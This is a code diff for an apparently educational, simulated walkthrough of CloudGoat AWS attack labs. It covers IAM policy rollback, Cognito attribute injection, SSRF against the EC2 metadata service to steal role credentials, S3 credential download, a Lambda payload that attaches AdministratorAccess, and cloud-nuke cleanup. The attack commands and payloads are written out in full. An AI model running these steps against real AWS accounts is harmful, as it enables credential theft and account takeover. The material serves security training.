+<div class="scr" data-id="8.1"><div class="badge">SSRF Exploitation</div><h1 class="ptitle">SSRF → Credential Theft</h1><p class="psub">Craft payloads, observe responses, chain the attack.</p><div class="cc mb-20" id="sc"><div class="cn" data-i="0"><div class="cib" style="border-color:var(--a);color:var(--a);background:rgba(240,160,48,.06)">URL</div><div class="cl">SSRF</div></div><div class="ca">→</div><div class="cn" data-i="1"><div class="cib" style="border-color:var(--cy);color:var(--cy);background:rgba(34,211,238,.06)">169</div><div class="cl">Metadata</div></div><div class="ca">→</div><div class="cn" data-i="2"><div class="cib" style="border-color:var(--r);color:var(--r);background:rgba(255,71,87,.06)">KEY</div><div class="cl">Creds</div></div><div class="ca">→</div><div class="cn" data-i="3"><div class="cib" style="border-color:var(--g);color:var(--g);background:rgba(0,232,123,.06)">S3</div><div class="cl">Secrets</div></div><div class="ca">→</div><div class="cn" data-i="4"><div class="cib" style="border-color:var(--r);color:#fff;background:var(--r)">ADM</div><div class="cl">Admin</div></div></div><div class="card mb-16" id="sb"><div style="display:flex;align-items:center;gap:10px"><label class="flbl" style="margin:0;white-space:nowrap">URL</label><input class="fi" id="su" style="flex:1" placeholder="http://54.234.112.87/?url=http://169.254.169.254/latest/meta-data/" autocomplete="off"><button class="btn btn1 btns" onclick="doSSRF()">Send →</button></div><div style="font-size:11px;color:var(--td);margin-top:6px">Step <span id="ssn">1</span>/4 — <span id="ssd">Query metadata root</span></div><div class="epan" id="se"><h4>Invalid URL</h4><p id="sem"></p><div class="fix" id="sef"></div></div></div><div class="term"><div class="th"><div class="td r"></div><div class="td y"></div><div class="td g"></div><span class="tt">ssrf</span></div><div class="tb2" id="t81" style="max-height:320px"></div></div><div class="mt-24"><button class="btn btn1" id="b90" onclick="nav('9.0')" disabled>Escalate via Lambda →</button></div></div>
+
+<div class="scr" data-id="9.0"><div class="badge">Serverless <span class="tag tag-home" style="margin-left:8px">Home Assignment</span></div><h1 class="ptitle">Lambda Architecture</h1><p class="psub">How Lambda execution roles create a privilege escalation path.</p><div class="arch mb-24" style="gap:16px;padding:32px"><div class="an"><div class="ai aws-iam"><svg viewBox="0 0 40 40" width="28" height="28"><circle cx="20" cy="14" r="5" fill="none" stroke="currentColor" stroke-width="2"/><path d="M12 28c0-4.4 3.6-8 8-8s8 3.6 8 8" fill="none" stroke="currentColor" stroke-width="2"/></svg></div><div class="an-l">Chris</div><div class="an-s">Limited</div></div><div class="aarr">assume →</div><div class="an"><div class="ai aws-iam">${ISVG}</div><div class="an-l">lambdaManager</div><div class="an-s">Create Lambda</div></div><div class="aarr">pass role →</div><div class="an vuln"><div class="ai aws-lam">${LSVG}</div><div class="an-l">Lambda</div><div class="an-s">Runs as cg-debug</div></div><div class="aarr atk">⚡</div><div class="an" style="border-color:rgba(255,71,87,.4)"><div class="ai aws-iam">${ISVG}</div><div class="an-l" style="color:var(--r)">cg-debug</div><div class="an-s" style="color:var(--r)">AdminAccess</div></div></div><div class="callout danger"><strong>Confused Deputy:</strong> Chris assumes <code>lambdaManager</code> → creates Lambda with <code>cg-debug</code> role → function runs admin-level IAM operations indirectly.</div><div class="mt-24"><button class="btn btn1" onclick="nav('9.1')">Begin Lambda Attack →</button></div></div>
+
+<div class="scr" data-id="9.1"><div class="badge">Lambda Exploitation</div><h1 class="ptitle">Malicious Lambda Deployment</h1><p class="psub">Select execution role, deploy payload, invoke to escalate.</p><div class="split"><div><h4>Payload</h4><div class="ceditor mt-8 mb-16"><div class="ceditor-h"><span>📄</span> lambda_escalate.py</div><div class="ceditor-b"><span class="kw">import</span> <span class="vr">boto3</span><br><br><span class="kw">def</span> <span class="fn">lambda_handler</span>(<span class="vr">event</span>, <span class="vr">context</span>):<br>&nbsp;&nbsp;&nbsp;&nbsp;<span class="vr">iam</span> = <span class="vr">boto3</span>.<span class="fn">client</span>(<span class="st">'iam'</span>)<br>&nbsp;&nbsp;&nbsp;&nbsp;<span class="vr">iam</span>.<span class="fn">attach_user_policy</span>(<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="vr">UserName</span>=<span class="st">'chris-lambda_privesc_cgid'</span>,<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="vr">PolicyArn</span>=<span class="st">'arn:aws:iam::aws:policy/AdministratorAccess'</span><br>&nbsp;&nbsp;&nbsp;&nbsp;)<br>&nbsp;&nbsp;&nbsp;&nbsp;<span class="kw">return</span> <span class="st">"Policy attached"</span></div></div><h4>Execution Role</h4><div class="oc mt-8"><div class="ocard" onclick="pkLR(this,'mgr')" style="margin-bottom:6px"><div class="oct">cg-lambdaManager</div><div class="ocd">Create/invoke Lambda. Cannot modify IAM.</div></div><div class="ocard" onclick="pkLR(this,'dbg')" style="margin-bottom:6px;border-color:rgba(255,71,87,.15)"><div style="display:flex;align-items:center;gap:8px"><div class="oct">cg-debug</div><span class="tag tag-crit">AdminAccess</span></div><div class="ocd">AdminAccess. Only assumable by Lambda.</div></div></div><div class="epan" id="lre"><h4>Wrong Role</h4><p><code>cg-lambdaManager</code> cannot modify IAM. The function will fail with <code>AccessDeniedException</code>.</p><div class="fix">Select <strong>cg-debug</strong> — it has AdminAccess.</div></div><button class="btn btn1 mt-16" id="bdep" onclick="depLam()" disabled>Deploy & Invoke →</button></div><div><div class="term"><div class="th"><div class="td r"></div><div class="td y"></div><div class="td g"></div><span class="tt">lambda</span></div><div class="tb2" id="t91"></div></div><div id="lok" class="fb ok mt-16">✓ AdministratorAccess attached to chris</div></div></div><div class="mt-24"><button class="btn btn1" id="b100" onclick="nav('10.0')" disabled>Cleanup →</button></div></div>
+
+<div class="scr" data-id="10.0"><div class="badge">Cloud-Nuke</div><h1 class="ptitle">Resource Cleanup</h1><p class="psub">Destroy all lab resources to avoid charges.</p><div class="split"><div><div class="card mb-16"><h4>Select Region</h4><div class="mt-8"><select class="fsel" id="nr"><option value="">Select...</option><option value="us-east-1">us-east-1 (N. Virginia)</option><option value="us-west-2">us-west-2 (Oregon)</option><option value="eu-west-1">eu-west-1 (Ireland)</option></select></div><div class="epan" id="nre"><h4>Wrong Region</h4><p>No resources in this region. Workshop deployed to <strong>us-east-1</strong>.</p><div class="fix">Select <strong>us-east-1</strong>.</div></div></div><div class="cbox dng" id="nc"><h4 style="color:var(--r)">⚠ Destructive Action</h4><p>Permanently delete all resources. Type <code>nuke</code>.</p><div class="crow"><input class="fi" id="ni" placeholder="Type nuke" autocomplete="off"><button class="btn btn1 btns" id="bn" onclick="doNk()" disabled>Nuke →</button></div></div></div><div><h4>Deletion Progress</h4><div class="card mt-8"><div class="ni"><div class="nlbl" style="color:var(--b)">IAM</div><div class="nbg"><div class="nf" id="nk-i"></div></div><div class="ns" id="nk-is">—</div></div><div class="ni"><div class="nlbl" style="color:var(--o)">Cognito</div><div class="nbg"><div class="nf" id="nk-c"></div></div><div class="ns" id="nk-cs">—</div></div><div class="ni"><div class="nlbl" style="color:var(--a)">EC2</div><div class="nbg"><div class="nf" id="nk-e"></div></div><div class="ns" id="nk-es">—</div></div><div class="ni"><div class="nlbl" style="color:var(--g)">S3</div><div class="nbg"><div class="nf" id="nk-s"></div></div><div class="ns" id="nk-ss">—</div></div><div class="ni"><div class="nlbl" style="color:var(--p)">Lambda</div><div class="nbg"><div class="nf" id="nk-l"></div></div><div class="ns" id="nk-ls">—</div></div></div><div id="nd" class="fb ok mt-16">✓ All Resources Destroyed</div><div class="term mt-16"><div class="th"><div class="td r"></div><div class="td y"></div><div class="td g"></div><span class="tt">cloud-nuke</span></div><div class="tb2" id="t10"></div></div></div></div><div class="mt-30 tc"><button class="btn btn1" id="bkc" onclick="nav('11')" disabled>Kill Chain →</button></div></div>
+
+<div class="scr" data-id="11"><div class="badge">Complete Attack Path</div><h1 class="ptitle">Full Kill Chain</h1><p class="psub">From zero to full compromise — every step.</p><div class="kcg" id="kc"><div class="kcp ph-r"><div class="kcl">Recon</div><div class="kcln"><div class="kcd"></div></div><div class="kcc"><h4>IAM Enumeration <span class="tag tag-iam" style="margin-left:6px">IAM</span></h4><p>Found 5 policy versions. v1 has Action:* Resource:*.</p></div></div><div class="kcp ph-e"><div class="kcl">Exploit</div><div class="kcln"><div class="kcd"></div></div><div class="kcc"><h4>Policy Rollback <span class="tag tag-iam" style="margin-left:6px">IAM</span></h4><p>Set default to v1 — instant admin.</p></div></div><div class="kcp ph-e"><div class="kcl">Exploit</div><div class="kcln"><div class="kcd"></div></div><div class="kcc"><h4>Cognito Injection <span class="tag tag-cog" style="margin-left:6px">Cognito</span></h4><p>Bypassed validation, injected admin, extracted creds.</p></div></div><div class="kcp ph-s"><div class="kcl">Escalate</div><div class="kcln"><div class="kcd"></div></div><div class="kcc"><h4>EC2 SSRF <span class="tag tag-ec2" style="margin-left:6px">EC2</span></h4><p>SSRF → metadata → stole IAM role credentials.</p></div></div><div class="kcp ph-x"><div class="kcl">Exfiltrate</div><div class="kcln"><div class="kcd"></div></div><div class="kcc"><h4>S3 Exfiltration <span class="tag tag-s3" style="margin-left:6px">S3</span></h4><p>Downloaded admin creds from secret bucket.</p></div></div><div class="kcp ph-i"><div class="kcl">Impact</div><div class="kcln"><div class="kcd"></div></div><div class="kcc"><h4>Lambda Escalation <span class="tag tag-lam" style="margin-left:6px">Lambda</span></h4><p>Malicious Lambda → AdministratorAccess → full takeover.</p></div></div></div><div class="mt-24 tc"><button class="btn btn2" onclick="nav('1')">↺ Restart Demo</button></div></div>
+`;
+
+// ═══ SCREEN INIT ═══
+function initScr(id){
+  const m={'1':()=>cntUp('[data-id="1"]'),'2':()=>cntUp('[data-id="2"]'),'4.3':initCLI,'5.3':initTZ,'7.2':initRecon,'7.3':initEsc,'8.1':initSSRF,'10.0':initNk,'11':initKC};
+  if(m[id])m[id]();
 }
+function chkPre(t){const v={aws:'aws-cli/2.15.17',py:'Python 3.11.7',tf:'Terraform v1.7.3',git:'git 2.43.0'};$(`pre-${t}`).innerHTML=`<span style="color:var(--g);font-size:13px;font-family:var(--mono)">✓ ${v[t]}</span>`;toast(`${t} verified`,'success')}
 
-// =================== SCREEN 2: SETUP WIZARD ===================
-function initSetupWizard() {
-  S.wizardStep = 1;
-  updateWizardUI();
-}
+// 4.2
+function mkIAM(){const u=$('iam-u').value.trim();const p=$('iam-pol').value;if(!u){$('iam-u').classList.add('err');$('iam-u-e').classList.add('vis');return}$('iam-u').classList.remove('err');$('iam-u-e').classList.remove('vis');if(!p){toast('Select a policy','warning');return}if(p!=='AdministratorAccess'){$('iam-pol-e').classList.add('vis');const m={PowerUserAccess:'Excludes IAM management — cannot enumerate or modify policies.',ReadOnlyAccess:'Read-only. Cannot create resources or execute attacks.'};$('iam-pol-em').textContent=m[p]||'Insufficient.';toast('Wrong policy','error');return}$('iam-pol-e').classList.remove('vis');$('adm-w').style.display='block';const t='t42';$(t).innerHTML='';aL(t,`aws iam create-user --user-name ${u}`,'cmd');aL(t,'','out');aL(t,sj({User:{UserName:u,Arn:`arn:aws:iam::012345678901:user/${u}`}}),'out');aL(t,'','out');aL(t,`User "${u}" created with AdministratorAccess`,'ok');toast(`User "${u}" created`,'success');setTimeout(()=>nav('4.3'),1200)}
 
-function updateWizardUI() {
-  $$('.wizard-step').forEach((s, i) => {
-    s.classList.remove('active','done');
-    if (i + 1 < S.wizardStep) s.classList.add('done');
-    else if (i + 1 === S.wizardStep) s.classList.add('active');
-  });
-  $$('.wizard-panel').forEach((p, i) => p.classList.toggle('active', i + 1 === S.wizardStep));
-}
+// 4.3
+const CLIP=[{p:'AWS Access Key ID [None]: ',h:'AKIAIOSFODNN7EXAMPLE'},{p:'AWS Secret Access Key [None]: ',h:'wJalrXUtnFEMI/K7MDENG/bPxRfi'},{p:'Default region name [None]: ',h:'us-east-1',v:v=>{if(v&&!/^[a-z]{2}-(east|west|north|south|central|northeast|southeast)-\d$/.test(v))return'Invalid region';return null}},{p:'Default output format [None]: ',h:'json',v:v=>{if(v&&!['json','table','text','yaml'].includes(v))return'Invalid format';return null}}];
+function initCLI(){$('t43').innerHTML='';S.cliStep=0;aL('t43','aws configure','cmd');pCLI()}
+function pCLI(){if(S.cliStep>=CLIP.length){fCLI();return}const p=CLIP[S.cliStep];$('cli-hc').textContent=p.h;aP('t43',p.p,p.h,v=>{if(p.v){const e=p.v(v);if(e){aL('t43',e,'err');pCLI();return}}S.cliStep++;pCLI()},p.h)}
+function cliHint(){const ins=$$('#t43 .tpi:not(:disabled)');if(ins.length){ins[ins.length-1].value=CLIP[S.cliStep]?.h||'';ins[ins.length-1].focus()}}
+async function fCLI(){$('cli-h').style.display='none';aL('t43','','out');aL('t43','Saved to ~/.aws/credentials','ok');await dly(600);aL('t43','','out');aP('t43','$ ','aws sts get-caller-identity',async()=>{aL('t43','','out');await tL('t43','Verifying...','inf',25);await dly(800);aL('t43','','out');aL('t43',sj({UserId:'AIDAIOSFODNN7EXAMPLE',Account:'012345678901',Arn:'arn:aws:iam::012345678901:user/iamadmin'}),'out');aL('t43','','out');aL('t43','Identity confirmed','ok');toast('CLI configured','success');setTimeout(()=>nav('5.1'),1200)},'aws sts get-caller-identity')}
 
-function wizardNext(from) {
-  if (from === 1) {
-    const u = $('iam-username').value.trim();
-    const p = $('iam-password').value.trim();
-    if (!u) { $('iam-username').classList.add('error'); $('iam-username-error').classList.add('visible'); $('iam-username').classList.add('shake'); setTimeout(()=>$('iam-username').classList.remove('shake'),300); return; }
-    if (p.length < 8 && p.length > 0) { $('iam-password').classList.add('error'); $('iam-password-error').classList.add('visible'); return; }
-    $('iam-username-error').classList.remove('visible'); $('iam-password-error').classList.remove('visible');
-    $('iam-username').classList.remove('error'); $('iam-password').classList.remove('error');
-    const user = u || 'iamadmin';
-    $('terminal-wp1').innerHTML = '';
-    addLine('terminal-wp1', `aws iam create-user --user-name ${user}`, 'command');
-    addLine('terminal-wp1', '', 'output');
-    addLine('terminal-wp1', syntaxJSON({ User: { UserName: user, UserId: 'AIDAIOSFODNN7EXAMPLE', Arn: `arn:aws:iam::012345678901:user/${user}`, CreateDate: '2024-03-15T10:00:00Z' } }), 'output');
-    addLine('terminal-wp1', '', 'output');
-    addLine('terminal-wp1', `User "${user}" created successfully`, 'success');
-    toast(`IAM user "${user}" created`, 'success');
-    S.wizardStep = 2; updateWizardUI();
-  } else if (from === 2) {
-    const cards = $$('#wp-2 .option-card.selected');
-    if (!cards.length) { toast('Select an access type first', 'warning'); return; }
-    $('both-access-check').style.display = 'flex';
-    toast('Access type configured', 'success');
-    S.wizardStep = 3; updateWizardUI();
-  } else if (from === 3) {
-    S.wizardStep = 4; updateWizardUI();
-    startCLIConfig();
-  }
-}
+// 5.1
+async function runSetup(){const t='t51';$(t).innerHTML='';await tL(t,'git clone https://github.com/RhinoSecurityLabs/cloudgoat.git','cmd',10);aL(t,'Cloning...','out');await dly(800);aL(t,'done.','out');aL(t,'','out');await tL(t,'pip install -r requirements.txt','cmd',10);await dly(600);aL(t,'Installed boto3...','out');aL(t,'','out');await tL(t,'cloudgoat create iam_privesc_by_rollback','cmd',10);await dly(1200);aL(t,'Applying Terraform...','inf');await dly(1500);aL(t,'Lab deployed successfully','ok');toast('Lab ready','success');setTimeout(()=>nav('5.2'),1200)}
 
-function selectOption(group, el) {
-  $$(`#wp-2 .option-card`).forEach(c => c.classList.remove('selected'));
-  el.classList.add('selected');
-  $('btn-access-next').disabled = false;
-}
+// 5.3
+function initTZ(){const t='t53';$(t).innerHTML='';aL(t,'aws sts get-caller-identity','cmd');aL(t,'','out');aL(t,'An error occurred (SignatureDoesNotMatch) when calling GetCallerIdentity: Signature expired','err');aL(t,'','out');aL(t,'Clock is out of sync','inf')}
 
-function filterPolicies(val) {
-  $$('#policy-list .option-card').forEach(c => {
-    c.style.display = c.dataset.policy.toLowerCase().includes(val.toLowerCase()) ? '' : 'none';
-  });
-}
+// 7.2
+const RCMDS=[{c:'aws sts get-caller-identity --profile raynor',h:'aws sts get-caller-identity --profile raynor'},{c:'aws iam list-attached-user-policies --user-name raynor-iam_privesc_by_rollback',h:'aws iam list-attached-user-policies ...'},{c:'aws iam list-policy-versions --policy-arn arn:aws:iam::012345678901:policy/cg-raynor-policy',h:'aws iam list-policy-versions ...'},{c:'aws iam get-policy-version --policy-arn arn:aws:iam::012345678901:policy/cg-raynor-policy --version-id v1',h:'aws iam get-policy-version ... --version-id v1'}];
+function initRecon(){$('t72').innerHTML='';S.reconStep=0;['f1','f2','f3','f4'].forEach(f=>{$(f).style.opacity='0';$(f).style.transform='translateY(8px)'});$('b73').disabled=true;pR()}
+function pR(){if(S.reconStep>=RCMDS.length){$('rh').style.display='none';$('b73').disabled=false;toast('Critical: v1 has full admin','error');return}$('rhc').textContent=RCMDS[S.reconStep].h;aP('t72','$ ',RCMDS[S.reconStep].h,async()=>{await doR(S.reconStep);S.reconStep++;pR()},RCMDS[S.reconStep].c)}
+function rHint(){const ins=$$('#t72 .tpi:not(:disabled)');if(ins.length){ins[ins.length-1].value=RCMDS[S.reconStep]?.c||'';ins[ins.length-1].focus()}}
+async function doR(n){const t='t72';aL(t,'','out');if(n===0){await dly(500);aL(t,sj({UserId:'AIDARAYNOR7EXAMPLE',Account:'012345678901',Arn:'arn:aws:iam::012345678901:user/raynor-iam_privesc_by_rollback'}),'out');$('f1').style.opacity='1';$('f1').style.transform='none';toast('User identified','info')}else if(n===1){await dly(600);aL(t,sj({AttachedPolicies:[{PolicyName:'cg-raynor-policy'}]}),'out');$('f2').style.opacity='1';$('f2').style.transform='none';toast('Policy found','info')}else if(n===2){await dly(600);aL(t,sj({Versions:[{VersionId:'v5',IsDefaultVersion:true},{VersionId:'v4',IsDefaultVersion:false},{VersionId:'v3',IsDefaultVersion:false},{VersionId:'v2',IsDefaultVersion:false},{VersionId:'v1',IsDefaultVersion:false}]}),'out');$('f3').style.opacity='1';$('f3').style.transform='none';toast('5 versions!','warning')}else if(n===3){await dly(800);aL(t,sj({PolicyVersion:{Document:{Statement:[{Effect:'Allow',Action:'*',Resource:'*'}]},VersionId:'v1'}}),'out');aL(t,'','out');aL(t,'CRITICAL: v1 = Action:* Resource:*','alrt');$('f4').style.opacity='1';$('f4').style.transform='none'}aL(t,'','out')}
 
-function selectPolicy(el) {
-  $$('#policy-list .option-card').forEach(c => c.classList.remove('selected'));
-  el.classList.add('selected');
-  $('btn-policy-next').disabled = false;
-  toast(`Policy "${el.dataset.policy}" selected`, 'info');
-}
+// 7.3
+const VPOL={v5:'Read-only IAM. Already default.',v4:'EC2 describe only.',v3:'S3 read-only.',v2:'CloudWatch read-only.'};
+function initEsc(){$('eb').classList.remove('vis');$('ec').classList.remove('vis');$('b74').disabled=true;$('t73').innerHTML='';$('ve').classList.remove('vis');$$('#vsel .ocard').forEach(c=>{c.classList.remove('sel','wrong')});$('ei').value='';$('be').disabled=true;$('ei').disabled=false;$('ei').oninput=function(){$('be').disabled=this.value.trim().toUpperCase()!=='ESCALATE'}}
+function pkV(el,v){$$('#vsel .ocard').forEach(c=>c.classList.remove('sel','wrong'));if(v!=='v1'){el.classList.add('wrong');$('vem').textContent=`Version ${v}: ${VPOL[v]} Insufficient for escalation.`;$('ve').classList.add('vis');$('ec').classList.remove('vis');toast(`${v} insufficient`,'warning');return}el.classList.add('sel');$('ve').classList.remove('vis');$('ec').classList.add('vis');$('ei').focus()}
+async function doEsc(){$('ei').disabled=true;$('be').disabled=true;const t='t73';await tL(t,'aws iam set-default-policy-version --policy-arn ...cg-raynor-policy --version-id v1','cmd',10);aL(t,'','out');await tL(t,'Processing...','inf',25);await dly(1200);aL(t,'','out');aL(t,'Default changed to v1','ok');aL(t,'','out');aL(t,'PRIVILEGE ESCALATED','alrt');$('eb').classList.add('vis');$('b74').disabled=false;toast('Escalated!','error')}
 
-// =================== CLI INTERACTIVE CONFIG ===================
-function startCLIConfig() {
-  const body = $('terminal-cli');
-  body.innerHTML = '';
-  S.cliStep = 0;
-  addLine('terminal-cli', 'aws configure', 'command');
-  promptNextCLI();
-}
+// 7.4
+function cogP(n){$$('[data-id="7.4"] .ptab').forEach((t,i)=>t.classList.toggle('act',i===n-1));$$('[data-id="7.4"] .pcont').forEach((c,i)=>c.classList.toggle('act',i===n-1))}
+async function cogSign(){const e=$('ce').value.trim()||'attacker@evil.com';const t='tc1';$(t).innerHTML='';await tL(t,`aws cognito-idp sign-up --client-id 4a3g... --username ${e}`,'cmd',8);aL(t,'','out');await dly(600);aL(t,sj({UserConfirmed:false,UserSub:'a1b2c3d4-...'}),'out');aL(t,'','out');aL(t,'Email validation bypassed','ok');toast('Bypass successful','success');await dly(1200);cogP(2)}
+async function cogInj(){const a=$('cat').value;const v=$('cav').value.trim()||'admin';if(!a){toast('Select attribute','warning');return}if(a==='email_verified'){$('caem').textContent='email_verified doesn\'t affect access control. App checks custom:access.';$('cae').classList.add('vis');toast('Wrong attribute','error');return}if(a==='custom:role'){$('caem').textContent='App doesn\'t check custom:role. Use custom:access.';$('cae').classList.add('vis');toast('Wrong attribute','error');return}if(a==='custom:access'&&v.toLowerCase()!=='admin'){$('caem').textContent=`"${v}" won't work. Identity Pool requires value "admin".`;$('cae').classList.add('vis');toast('Wrong value','error');return}$('cae').classList.remove('vis');const t='tc2';$(t).innerHTML='';await tL(t,'aws cognito-idp update-user-attributes --access-token eyJ... --user-attributes \'[{"Name":"custom:access","Value":"admin"}]\'','cmd',7);aL(t,'','out');await dly(600);aL(t,'custom:access = admin — injected','alrt');toast('Admin injected!','error');await dly(1200);cogP(3)}
+async function cogExt(){const t='tc3';$(t).innerHTML='';await tL(t,'aws cognito-identity get-credentials-for-identity ...','cmd',10);aL(t,'','out');await dly(1000);aL(t,sj({Credentials:{AccessKeyId:'ASIAZ3EXAMPLE7COGNITO',SecretKey:'wJalr+CognitoTemp/K7MDENG',Expiration:'2024-03-15T18:30:00Z'}}),'out');aL(t,'','out');aL(t,'Temp AWS credentials obtained','alrt');$('ccr').classList.add('vis');$('b80').disabled=false;toast('Credentials extracted','error')}
 
-function promptNextCLI() {
-  if (S.cliStep >= S.cliPrompts.length) {
-    finishCLIConfig();
-    return;
-  }
-  const p = S.cliPrompts[S.cliStep];
-  $('cli-hint-cmd').textContent = p.hint;
-  addPromptInput('terminal-cli', p.prompt, p.hint, (val) => {
-    S.cliStep++;
-    promptNextCLI();
-  }, p.answer);
-}
+// 8.1
+const SSRFS=[{u:'http://54.234.112.87/?url=http://169.254.169.254/latest/meta-data/',d:'Query metadata root'},{u:'http://54.234.112.87/?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/',d:'Discover IAM role'},{u:'http://54.234.112.87/?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/cg-ec2-role-cloud_breach_s3_cgid',d:'Extract credentials'},{u:'aws s3 cp s3://cg-secret-s3-bucket-cgid/admin-credentials.txt ./ --profile stolen',d:'Download from S3'}];
+function initSSRF(){$('t81').innerHTML='';S.ssrfStep=0;$$('#sc .cn').forEach(n=>n.classList.remove('vis'));$$('#sc .ca').forEach(a=>a.classList.remove('vis'));$('b90').disabled=true;$('su').value=SSRFS[0].u;updSSRF()}
+function updSSRF(){const s=SSRFS[S.ssrfStep];if(s){$('ssn').textContent=S.ssrfStep+1;$('ssd').textContent=s.d}}
+async function doSSRF(){const url=$('su').value.trim();if(!url){toast('Enter URL','warning');return}$('se').classList.remove('vis');const st=S.ssrfStep;if(st<3&&!url.includes('169.254.169.254')&&!url.includes('54.234.112.87')){$('sem').textContent='URL doesn\'t target the vulnerable app or metadata.';$('sef').textContent='Use 54.234.112.87/?url=http://169.254.169.254/...';$('se').classList.add('vis');toast('Invalid target','error');return}if(st<3&&url.includes('169.254.169.254')&&!url.includes('54.234.112.87')){$('sem').textContent='Cannot reach IMDS directly. Must go through the web app.';$('sef').textContent='Wrap in ?url= parameter.';$('se').classList.add('vis');toast('Cannot reach directly','error');return}const t='t81';const ns=$$('#sc .cn');const as=$$('#sc .ca');if(ns[st])ns[st].classList.add('vis');if(st>0&&as[st-1])as[st-1].classList.add('vis');if(st===0){await tL(t,`curl "${url}"`,'cmd',10);aL(t,'','out');await dly(600);aL(t,'ami-id\ninstance-id\niam/','out');aL(t,'','out');aL(t,'Metadata accessible','inf');toast('Metadata reached','info')}else if(st===1){await tL(t,`curl "${url}"`,'cmd',10);aL(t,'','out');await dly(600);aL(t,'cg-ec2-role-cloud_breach_s3_cgid','out');aL(t,'','out');aL(t,'Role discovered','inf');toast('Role found','warning')}else if(st===2){await tL(t,`curl "${url}"`,'cmd',10);aL(t,'','out');await dly(1000);aL(t,sj({Code:'Success',AccessKeyId:'ASIAZ3EXAMPLESSRF01',SecretAccessKey:'wJalr+SSRFstolen/K7MDENG',Token:'IQoJb3J...'}),'out');aL(t,'','out');aL(t,'Credentials stolen via SSRF','alrt');if(as[st])as[st].classList.add('vis');toast('Stolen!','error')}else if(st===3){await tL(t,url,'cmd',10);aL(t,'','out');await dly(800);aL(t,'download: s3://...admin-credentials.txt → ./','out');aL(t,'','out');aL(t,'Admin creds exfiltrated','ok');if(ns[4])ns[4].classList.add('vis');if(as[3])as[3].classList.add('vis');$('b90').disabled=false;toast('Admin creds downloaded','error')}aL(t,'','out');S.ssrfStep++;if(S.ssrfStep<SSRFS.length){$('su').value=SSRFS[S.ssrfStep].u;updSSRF()}else{$('sb').style.opacity='.4';$('sb').style.pointerEvents='none';$('ssd').textContent='Complete'}}
 
-function useHint() {
-  const inputs = $$('#terminal-cli .terminal-prompt-input:not(:disabled)');
-  if (inputs.length) {
-    const input = inputs[inputs.length - 1];
-    input.value = S.cliPrompts[S.cliStep]?.hint || '';
-    input.focus();
-  }
-}
+// 9.1
+function pkLR(el,r){$$('[data-id="9.1"] .ocard').forEach(c=>c.classList.remove('sel','wrong'));$('lre').classList.remove('vis');if(r==='mgr'){el.classList.add('wrong');$('lre').classList.add('vis');$('bdep').disabled=true;toast('Wrong role','error');const t='t91';$(t).innerHTML='';aL(t,'aws lambda create-function ... --role cg-lambdaManager ...','cmd');aL(t,'Function created','out');aL(t,'aws lambda invoke ...','cmd');aL(t,'AccessDeniedException: ...cg-lambdaManager... not authorized to perform iam:AttachUserPolicy','err');return}el.classList.add('sel');S.lamRole=r;$('bdep').disabled=false;toast('cg-debug — correct','warning')}
+async function depLam(){$('lok').classList.remove('vis');$('bdep').disabled=true;$('b100').disabled=true;const t='t91';$(t).innerHTML='';await tL(t,'aws sts assume-role --role-arn ...cg-lambdaManager --role-session-name mgr','cmd',8);aL(t,'','out');await dly(600);aL(t,'Assumed lambdaManager','ok');aL(t,'','out');await tL(t,'aws lambda create-function --function-name escalate_privs --role ...cg-debug-role ...','cmd',7);aL(t,'','out');await dly(1000);aL(t,'Lambda created with cg-debug','inf');aL(t,'','out');modal('Confirm Invocation','<p style="font-size:14px;color:var(--t2)">Invoke <code>escalate_privs</code>? Will attach <strong style="color:var(--r)">AdministratorAccess</strong> to chris.</p>','<button class="btn btng" onclick="cModal()">Cancel</button><button class="btn btn1" onclick="cModal();invLam()">Invoke →</button>')}
+async function invLam(){const t='t91';await tL(t,'aws lambda invoke --function-name escalate_privs /tmp/out.txt','cmd',12);aL(t,'','out');await dly(1200);aL(t,sj({StatusCode:200}),'out');aL(t,'','out');aL(t,'aws iam list-attached-user-policies --user-name chris-...','cmd');await dly(600);aL(t,'','out');aL(t,sj({AttachedPolicies:[{PolicyName:'cg-chris-policy'},{PolicyName:'AdministratorAccess'}]}),'out');aL(t,'','out');aL(t,'AdministratorAccess attached — full takeover','alrt');$('lok').classList.add('vis');$('b100').disabled=false;toast('Full takeover!','error')}
 
-async function finishCLIConfig() {
-  $('cli-hint').style.display = 'none';
-  addLine('terminal-cli', '', 'output');
-  addLine('terminal-cli', 'Configuration saved to ~/.aws/credentials', 'success');
-  toast('AWS CLI configured', 'success');
-  await delay(800);
-  S.wizardStep = 5; updateWizardUI();
-  startVerify();
-}
+// 10.0
+function initNk(){$('nd').classList.remove('vis');$('nc').classList.remove('vis');$('t10').innerHTML='';$('nr').value='';$('ni').value='';$('bn').disabled=true;$('ni').disabled=false;$('nre').classList.remove('vis');$('bkc').disabled=true;['i','c','e','s','l'].forEach(r=>{$(`nk-${r}`).style.width='0%';const s=$(`nk-${r}s`);s.textContent='—';s.style.color=''});$('nr').onchange=function(){$('nre').classList.remove('vis');if(this.value&&this.value!=='us-east-1'){$('nre').classList.add('vis');$('nc').classList.remove('vis');toast('Wrong region','warning');return}if(this.value==='us-east-1'){$('nc').classList.add('vis');$('ni').focus()}};$('ni').oninput=function(){$('bn').disabled=this.value.trim().toLowerCase()!=='nuke'}}
+async function doNk(){$('ni').disabled=true;$('bn').disabled=true;const t='t10';await tL(t,'cloud-nuke aws --region us-east-1','cmd',12);aL(t,'','out');await tL(t,'Scanning 119 resource types...','inf',18);await dly(1000);aL(t,'Found 14 resources','out');aL(t,'Deleting...','alrt');const rs=['i','c','e','s','l'];const dl=[1500,1000,1800,800,700];for(let i=0;i<rs.length;i++){$(`nk-${rs[i]}s`).textContent='⏳';await dly(300);$(`nk-${rs[i]}`).style.width='100%';await dly(dl[i]);$(`nk-${rs[i]}s`).textContent='✓';$(`nk-${rs[i]}s`).style.color='var(--g)';aL(t,`  ${rs[i].toUpperCase()} deleted`,'ok')}aL(t,'','out');aL(t,'All destroyed','ok');$('nd').classList.add('vis');$('bkc').disabled=false;toast('Clean','success')}
 
-function startVerify() {
-  $('terminal-verify').innerHTML = '';
-  addPromptInput('terminal-verify', '$ ', 'aws sts get-caller-identity', async (val) => {
-    $('verify-hint').style.display = 'none';
-    addLine('terminal-verify', '', 'output');
-    await typeLine('terminal-verify', 'Verifying identity...', 'info', 30);
-    await delay(1000);
